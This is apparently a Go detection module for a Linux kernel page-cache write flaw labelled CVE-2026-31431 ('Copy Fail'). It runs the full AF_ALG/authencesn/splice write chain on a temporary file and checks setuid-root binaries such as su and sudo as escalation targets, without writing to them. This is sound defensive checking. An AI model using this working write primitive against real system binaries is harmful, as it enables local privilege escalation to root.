package util

import (
	"encoding/binary"
	"fmt"
	"os"
	"strings"
	"syscall"
	"unsafe"

	"golang.org/x/sys/unix"
)

// CopyFailResult represents the result of CVE-2026-31431 (Copy Fail) detection.
type CopyFailResult struct {
	Vulnerable          bool   // true if kernel page cache write bug exists (Phase 1)
	EscalationConfirmed bool   // true if all privilege escalation conditions are met (Phase 2)
	Description         string // human-readable summary of findings
	Details             string // step-by-step test results
	SetuidTarget        string // which setuid binary was tested (if any)
}

// setuidBinary represents a setuid-root binary candidate for Phase 2 testing.
type setuidBinary struct {
	Path     string
	Readable bool
}

// Known setuid-root binary paths to check in Phase 2.
var setuidPaths = []string{
	"/usr/bin/su",
	"/usr/bin/sudo",
	"/usr/bin/passwd",
	"/usr/bin/newgrp",
}

// AF_ALG constants not exposed by golang.org/x/sys/unix.
const (
	solALG             = 279 // SOL_ALG
	algSetKey          = 1   // ALG_SET_KEY
	algSetIV           = 2   // ALG_SET_IV
	algSetOP           = 3   // ALG_SET_OP
	algSetAEADAssoclen = 4   // ALG_SET_AEAD_ASSOCLEN
	algSetAEADAuthsize = 5   // ALG_SET_AEAD_AUTHSIZE
)

// nativeByteOrder returns the native byte order of the current platform.
var nativeByteOrder binary.ByteOrder = func() binary.ByteOrder {
	var x uint32 = 0x01020304
	if *(*byte)(unsafe.Pointer(&x)) == 0x01 {
		return binary.BigEndian
	}
	return binary.LittleEndian
}()

// CheckCopyFail performs a safe, non-destructive test for CVE-2026-31431.
//
// Phase 1: Tests if the kernel allows a controlled page cache write by
// exercising the AF_ALG + authencesn + splice chain against a temporary file.
//
// Phase 2 (only if Phase 1 succeeds): Verifies that privilege escalation
// conditions are met (setuid-root binaries exist, readable, and splice-able)
// without writing to any system file.
func CheckCopyFail() CopyFailResult {
	var details []string

	// Phase 1: Test AF_ALG availability
	err := checkAFALGAvailable()
	if err != nil {
		desc := fmt.Sprintf("Not vulnerable: %s", err.Error())
		details = append(details, desc)
		return CopyFailResult{
			Vulnerable:  false,
			Description: desc,
			Details:     strings.Join(details, "\n"),
		}
	}
	details = append(details, "AF_ALG socket and authencesn available")

	// Phase 1: Test page cache write on temp file
	vulnerable, phase1Details, err := testPageCacheWriteTempFile()
	details = append(details, phase1Details...)
	if err != nil {
		desc := fmt.Sprintf("Inconclusive: %s", err.Error())
		return CopyFailResult{
			Vulnerable:  false,
			Description: desc,
			Details:     strings.Join(details, "\n"),
		}
	}

	if !vulnerable {
		desc := "Not vulnerable: kernel has the fix (out-of-place operation)"
		details = append(details, desc)
		return CopyFailResult{
			Vulnerable:  false,
			Description: desc,
			Details:     strings.Join(details, "\n"),
		}
	}
	details = append(details, "VULNERABLE: page cache write confirmed on temp file")

	// Phase 2: Check privilege escalation conditions
	escalation, target, phase2Details := checkEscalationConditions()
	details = append(details, phase2Details...)

	desc := "Vulnerable to CVE-2026-31431 (Copy Fail)"
	if escalation {
		desc = fmt.Sprintf("Vulnerable to CVE-2026-31431 — privilege escalation possible via %s", target)
	}

	return CopyFailResult{
		Vulnerable:          true,
		EscalationConfirmed: escalation,
		Description:         desc,
		Details:             strings.Join(details, "\n"),
		SetuidTarget:        target,
	}
}

// checkAFALGAvailable tests if AF_ALG sockets can be created and authencesn is available.
func checkAFALGAvailable() error {
	fd, err := unix.Socket(unix.AF_ALG, unix.SOCK_SEQPACKET, 0)
	if err != nil {
		return fmt.Errorf("AF_ALG socket creation failed: %w", err)
	}
	defer unix.Close(fd)

	sa := &unix.SockaddrALG{
		Type: "aead",
		Name: "authencesn(hmac(sha256),cbc(aes))",
	}
	err = unix.Bind(fd, sa)
	if err != nil {
		return fmt.Errorf("authencesn bind failed (module not available): %w", err)
	}

	return nil
}

// testPageCacheWriteTempFile creates a temp file, attempts the exploit chain,
// and checks if the page cache was written. Returns (vulnerable, details, error).
func testPageCacheWriteTempFile() (bool, []string, error) {
	var details []string

	// Create temp file with known content
	tmpFile, err := os.CreateTemp("/tmp", "txlog-copyfail-*")
	if err != nil {
		return false, details, fmt.Errorf("failed to create temp file: %w", err)
	}
	tmpPath := tmpFile.Name()
	defer os.Remove(tmpPath)

	// Write known content: 64 bytes of 0x41 ('A')
	knownContent := make([]byte, 64)
	for i := range knownContent {
		knownContent[i] = 0x41
	}
	if _, err := tmpFile.Write(knownContent); err != nil {
		tmpFile.Close()
		return false, details, fmt.Errorf("failed to write temp file: %w", err)
	}
	tmpFile.Close()
	details = append(details, fmt.Sprintf("Temp file created: %s", tmpPath))

	// The marker we want to write via the exploit chain (4 bytes)
	marker := []byte{0xDE, 0xAD, 0xBE, 0xEF}

	// Attempt the page cache write
	written, err := testPageCacheWrite(tmpPath, marker)
	if err != nil {
		details = append(details, fmt.Sprintf("Page cache write test error: %s", err.Error()))
		return false, details, err
	}

	if written {
		details = append(details, "Page cache write DETECTED — marker found in temp file")
	} else {
		details = append(details, "Page cache unchanged — marker NOT found")
	}

	return written, details, nil
}

// testPageCacheWrite performs the AF_ALG + authencesn + splice + recv chain
// against the given file and checks if the marker was written to its page cache.
func testPageCacheWrite(filePath string, marker []byte) (bool, error) {
	if len(marker) != 4 {
		return false, fmt.Errorf("marker must be exactly 4 bytes")
	}

	// Open target file read-only (gets page-cache-backed fd)
	targetFd, err := unix.Open(filePath, unix.O_RDONLY, 0)
	if err != nil {
		return false, fmt.Errorf("failed to open target file: %w", err)
	}
	defer unix.Close(targetFd)

	// Create AF_ALG socket
	algFd, err := unix.Socket(unix.AF_ALG, unix.SOCK_SEQPACKET, 0)
	if err != nil {
		return false, fmt.Errorf("AF_ALG socket failed: %w", err)
	}
	defer unix.Close(algFd)

	// Bind to authencesn(hmac(sha256),cbc(aes))
	sa := &unix.SockaddrALG{
		Type: "aead",
		Name: "authencesn(hmac(sha256),cbc(aes))",
	}
	if err := unix.Bind(algFd, sa); err != nil {
		return false, fmt.Errorf("bind failed: %w", err)
	}

	// Set encryption key: matches the Python exploit's key format
	// 0x0800010000000010 + 32 zero bytes
	key := make([]byte, 40)
	key[0] = 0x08
	key[1] = 0x00
	key[2] = 0x01
	key[3] = 0x00
	key[4] = 0x00
	key[5] = 0x00
	key[6] = 0x00
	key[7] = 0x10
	// bytes 8-39 are zeros (key material)
	if err := setsockoptBytes(algFd, solALG, algSetKey, key); err != nil {
		return false, fmt.Errorf("set key failed: %w", err)
	}

	// Set AEAD auth size = 4
	// ALG_SET_AEAD_AUTHSIZE uses optlen as the auth size value, optval is NULL
	if err := setsockoptAuthsize(algFd, solALG, algSetAEADAuthsize, 4); err != nil {
		return false, fmt.Errorf("set authsize failed: %w", err)
	}

	// Accept request socket (use raw syscall; Go's unix.Accept uses
	// accept4 with SOCK_CLOEXEC|SOCK_NONBLOCK which AF_ALG rejects)
	reqFd, err := algAccept(algFd)
	if err != nil {
		return false, fmt.Errorf("accept failed: %w", err)
	}
	defer unix.Close(reqFd)

	// Build AAD: bytes 0-3 = padding ("AAAA"), bytes 4-7 = marker (seqno_lo)
	// The marker bytes 4-7 are what authencesn writes at dst[assoclen+cryptlen]
	aad := make([]byte, 8)
	copy(aad[:4], []byte("AAAA"))
	copy(aad[4:], marker)

	// Build control messages for sendmsg
	oob := buildCmsgBytes(solALG, algSetOP, make([]byte, 4))                          // ALG_OP_DECRYPT = 0
	oob = append(oob, buildCmsgBytes(solALG, algSetIV, makeIV(16))...)                // 16-byte IV
	oob = append(oob, buildCmsgBytes(solALG, algSetAEADAssoclen, makeAssoclen(8))...) // assoclen = 8

	// sendmsg with MSG_MORE
	if err := unix.Sendmsg(reqFd, aad, oob, nil, unix.MSG_MORE); err != nil {
		return false, fmt.Errorf("sendmsg failed: %w", err)
	}

	// splice: target file → pipe → AF_ALG socket
	pipeR, pipeW, err := osPipe()
	if err != nil {
		return false, fmt.Errorf("pipe failed: %w", err)
	}
	defer unix.Close(pipeR)
	defer unix.Close(pipeW)

	spliceLen := int64(4)
	off := int64(0)

	// splice from file to pipe
	n, err := unix.Splice(targetFd, &off, pipeW, nil, int(spliceLen), unix.SPLICE_F_MOVE)
	if err != nil || n != spliceLen {
		return false, fmt.Errorf("splice file→pipe failed: %w (n=%d)", err, n)
	}

	// splice from pipe to AF_ALG socket
	n, err = unix.Splice(pipeR, nil, reqFd, nil, int(spliceLen), unix.SPLICE_F_MOVE)
	if err != nil || n != spliceLen {
		return false, fmt.Errorf("splice pipe→AF_ALG failed: %w (n=%d)", err, n)
	}

	// recv() triggers the decrypt → page cache write
	// The HMAC will fail (fabricated ciphertext), but the 4-byte write persists
	recvBuf := make([]byte, 128)
	_, _ = unix.Read(reqFd, recvBuf) // error expected, ignore

	// Re-read the file via a fresh open to check page cache
	checkFd, err := unix.Open(filePath, unix.O_RDONLY, 0)
	if err != nil {
		return false, fmt.Errorf("failed to re-open file for verification: %w", err)
	}
	defer unix.Close(checkFd)

	readBuf := make([]byte, 64)
	_, err = unix.Read(checkFd, readBuf)
	if err != nil {
		return false, fmt.Errorf("failed to read file for verification: %w", err)
	}

	// Check if the marker appears anywhere in the file's page cache.
	// The write target depends on assoclen + cryptlen offset mapping.
	for i := 0; i <= len(readBuf)-4; i++ {
		if readBuf[i] == marker[0] &&
			readBuf[i+1] == marker[1] &&
			readBuf[i+2] == marker[2] &&
			readBuf[i+3] == marker[3] {
			return true, nil
		}
	}

	return false, nil
}

// checkEscalationConditions verifies Phase 2 conditions for privilege escalation.
// Returns (escalationPossible, targetBinary, details).
func checkEscalationConditions() (bool, string, []string) {
	var details []string

	// Step 1: Find setuid-root binaries
	binaries := findSetuidBinaries()
	if len(binaries) == 0 {
		details = append(details, "No setuid-root binaries found")
		return false, "", details
	}

	var readableBinaries []setuidBinary
	for _, b := range binaries {
		if b.Readable {
			readableBinaries = append(readableBinaries, b)
			details = append(details, fmt.Sprintf("Setuid-root binary found and readable: %s", b.Path))
		} else {
			details = append(details, fmt.Sprintf("Setuid-root binary found but NOT readable: %s", b.Path))
		}
	}

	if len(readableBinaries) == 0 {
		details = append(details, "No readable setuid-root binaries — escalation unlikely")
		return false, "", details
	}

	// Step 2: Test splice to AF_ALG pipeline (without recv)
	for _, b := range readableBinaries {
		spliceOK, err := testSpliceToAFALG(b.Path)
		if err != nil {
			details = append(details, fmt.Sprintf("Splice test error for %s: %s", b.Path, err.Error()))
			continue
		}
		if spliceOK {
			details = append(details, fmt.Sprintf("splice() to AF_ALG works for %s — escalation conditions MET", b.Path))
			return true, b.Path, details
		}
		details = append(details, fmt.Sprintf("splice() to AF_ALG failed for %s", b.Path))
	}

	details = append(details, "splice() to AF_ALG failed for all setuid binaries")
	return false, "", details
}

// findSetuidBinaries scans known paths for setuid-root binaries.
func findSetuidBinaries() []setuidBinary {
	var binaries []setuidBinary

	for _, path := range setuidPaths {
		info, err := os.Stat(path)
		if err != nil {
			continue
		}

		mode := info.Mode()
		// Check if setuid bit is set
		if mode&os.ModeSetuid == 0 {
			continue
		}

		// Check if owned by root (uid 0)
		stat, ok := info.Sys().(*syscall.Stat_t)
		if !ok || stat.Uid != 0 {
			continue
		}

		// Check if readable by current user
		readable := true
		fd, err := unix.Open(path, unix.O_RDONLY, 0)
		if err != nil {
			readable = false
		} else {
			unix.Close(fd)
		}

		binaries = append(binaries, setuidBinary{
			Path:     path,
			Readable: readable,
		})
	}

	return binaries
}

// testSpliceToAFALG sets up the full AF_ALG pipeline with a file's pages
// but does NOT call recv(). This proves the splice path works without
// triggering the destructive page cache write.
func testSpliceToAFALG(filePath string) (bool, error) {
	// Open target file read-only
	targetFd, err := unix.Open(filePath, unix.O_RDONLY, 0)
	if err != nil {
		return false, fmt.Errorf("open failed: %w", err)
	}
	defer unix.Close(targetFd)

	// Create AF_ALG socket
	algFd, err := unix.Socket(unix.AF_ALG, unix.SOCK_SEQPACKET, 0)
	if err != nil {
		return false, fmt.Errorf("AF_ALG socket failed: %w", err)
	}
	defer unix.Close(algFd)

	// Bind to authencesn
	sa := &unix.SockaddrALG{
		Type: "aead",
		Name: "authencesn(hmac(sha256),cbc(aes))",
	}
	if err := unix.Bind(algFd, sa); err != nil {
		return false, fmt.Errorf("bind failed: %w", err)
	}

	// Set key
	key := make([]byte, 40)
	key[0] = 0x08
	key[1] = 0x00
	key[2] = 0x01
	key[3] = 0x00
	key[4] = 0x00
	key[5] = 0x00
	key[6] = 0x00
	key[7] = 0x10
	if err := setsockoptBytes(algFd, solALG, algSetKey, key); err != nil {
		return false, fmt.Errorf("set key failed: %w", err)
	}

	// Set auth size
	if err := setsockoptAuthsize(algFd, solALG, algSetAEADAuthsize, 4); err != nil {
		return false, fmt.Errorf("set authsize failed: %w", err)
	}

	// Accept request socket (use raw syscall; Go's unix.Accept uses
	// accept4 with SOCK_CLOEXEC|SOCK_NONBLOCK which AF_ALG rejects)
	reqFd, err := algAccept(algFd)
	if err != nil {
		return false, fmt.Errorf("accept failed: %w", err)
	}
	defer unix.Close(reqFd)

	// sendmsg with dummy AAD
	aad := []byte("AAAAAAAA") // 8 bytes dummy AAD

	oob := buildCmsgBytes(solALG, algSetOP, make([]byte, 4))
	oob = append(oob, buildCmsgBytes(solALG, algSetIV, makeIV(16))...)
	oob = append(oob, buildCmsgBytes(solALG, algSetAEADAssoclen, makeAssoclen(8))...)

	if err := unix.Sendmsg(reqFd, aad, oob, nil, unix.MSG_MORE); err != nil {
		return false, fmt.Errorf("sendmsg failed: %w", err)
	}

	// splice: target file → pipe → AF_ALG socket
	pipeR, pipeW, err := osPipe()
	if err != nil {
		return false, fmt.Errorf("pipe failed: %w", err)
	}
	defer unix.Close(pipeR)
	defer unix.Close(pipeW)

	spliceLen := int64(4)
	off := int64(0)

	n, err := unix.Splice(targetFd, &off, pipeW, nil, int(spliceLen), unix.SPLICE_F_MOVE)
	if err != nil || n != spliceLen {
		return false, fmt.Errorf("splice file→pipe failed: %w (n=%d)", err, n)
	}

	n, err = unix.Splice(pipeR, nil, reqFd, nil, int(spliceLen), unix.SPLICE_F_MOVE)
	if err != nil || n != spliceLen {
		return false, fmt.Errorf("splice pipe→AF_ALG failed: %w (n=%d)", err, n)
	}

	// *** DO NOT call recv() *** — this would trigger the page cache write.
	// Close the socket to clean up. The kernel releases the scatterlist
	// and page cache pages are returned unmodified.

	return true, nil
}

// buildCmsgBytes constructs a control message (cmsg) for sendmsg using
// the native byte order of the platform.
func buildCmsgBytes(level, typ int, data []byte) []byte {
	cmsgLen := unix.CmsgLen(len(data))
	cmsgSpace := unix.CmsgSpace(len(data))

	buf := make([]byte, cmsgSpace)

	// Write cmsg header using native byte order
	nativeByteOrder.PutUint64(buf[0:8], uint64(cmsgLen))
	nativeByteOrder.PutUint32(buf[8:12], uint32(level))
	nativeByteOrder.PutUint32(buf[12:16], uint32(typ))

	// Write data after header (at CmsgLen(0) offset)
	copy(buf[unix.CmsgLen(0):], data)

	return buf
}

// makeIV creates an IV control message data buffer.
// Format: 4 bytes IV length (native endian) + IV bytes (zeros).
func makeIV(ivLen int) []byte {
	buf := make([]byte, 4+ivLen)
	nativeByteOrder.PutUint32(buf[0:4], uint32(ivLen))
	return buf
}

// makeAssoclen creates an assoclen control message data buffer.
// Format: 4 bytes assoclen value (native endian).
func makeAssoclen(assoclen uint32) []byte {
	buf := make([]byte, 4)
	nativeByteOrder.PutUint32(buf[0:4], assoclen)
	return buf
}

// osPipe creates a pipe and returns (readFd, writeFd, error).
func osPipe() (int, int, error) {
	var fds [2]int
	err := unix.Pipe(fds[:])
	if err != nil {
		return 0, 0, err
	}
	return fds[0], fds[1], nil
}

// setsockoptBytes calls setsockopt with raw byte data (no null terminator).
func setsockoptBytes(fd, level, opt int, data []byte) error {
	var p unsafe.Pointer
	if len(data) > 0 {
		p = unsafe.Pointer(&data[0])
	}
	_, _, errno := unix.Syscall6(
		unix.SYS_SETSOCKOPT,
		uintptr(fd),
		uintptr(level),
		uintptr(opt),
		uintptr(p),
		uintptr(len(data)),
		0,
	)
	if errno != 0 {
		return errno
	}
	return nil
}

// setsockoptAuthsize calls setsockopt for ALG_SET_AEAD_AUTHSIZE.
// The kernel uses optlen as the auth size value and optval is NULL.
func setsockoptAuthsize(fd, level, opt int, authsize int) error {
	_, _, errno := unix.Syscall6(
		unix.SYS_SETSOCKOPT,
		uintptr(fd),
		uintptr(level),
		uintptr(opt),
		0, // NULL
		uintptr(authsize),
		0,
	)
	if errno != 0 {
		return errno
	}
	return nil
}

// algAccept performs a raw accept() syscall on an AF_ALG socket.
// Go's unix.Accept() uses accept4 with SOCK_CLOEXEC|SOCK_NONBLOCK flags
// which AF_ALG sockets do not support, causing ECONNABORTED.
func algAccept(fd int) (int, error) {
	reqFd, _, errno := unix.Syscall(unix.SYS_ACCEPT, uintptr(fd), 0, 0)
	if errno != 0 {
		return -1, errno
	}
	return int(reqFd), nil
}
